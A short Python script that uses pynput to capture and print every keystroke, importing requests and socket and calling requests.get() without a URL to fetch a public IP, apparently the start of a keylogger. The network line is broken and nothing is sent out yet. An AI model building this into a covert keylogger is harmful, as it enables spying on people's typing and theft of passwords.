from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket

publicIP = requests.get()

def on_press(key):
    print(key)

with Listener(on_press=on_press) as listener:
    listener.join()